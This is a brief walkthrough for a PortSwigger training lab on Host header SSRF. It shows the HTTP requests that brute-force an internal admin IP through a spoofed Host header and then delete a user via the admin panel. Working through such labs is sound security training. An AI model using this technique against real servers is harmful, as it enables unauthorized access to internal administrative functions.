The steps below are meant to solve the following lab:
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

IP Range: 192.168.0.0/24

This lab accepts requests with full paths like so:

GET https://[SUB_DOMAIN].web-security-academy.net/admin HTTP/1.1
Host: [SUB_DOMAIN].web-security-academy.net

Intercept request to "https://[SUB_DOMAIN].web-security-academy.net/admin".
Change the GET path to "https://[SUB_DOMAIN].web-security-academy.net/admin" and the Host header value to "Host: 192.168.0.0", like so:

GET https://[SUB_DOMAIN].web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.0

Send this to  intruder and enumerate through the last octet of the IP address until you get a 200 status code.

Once the valid IP address is found send a request similar to the following:

GET https://[SUB_DOMAIN].web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.180

Intercept the request to delete Carlos as well and modify the request similar to the following:


POST https://[SUB_DOMAIN].web-security-academy.net/admin/delete HTTP/1.1
Host: 192.168.0.180
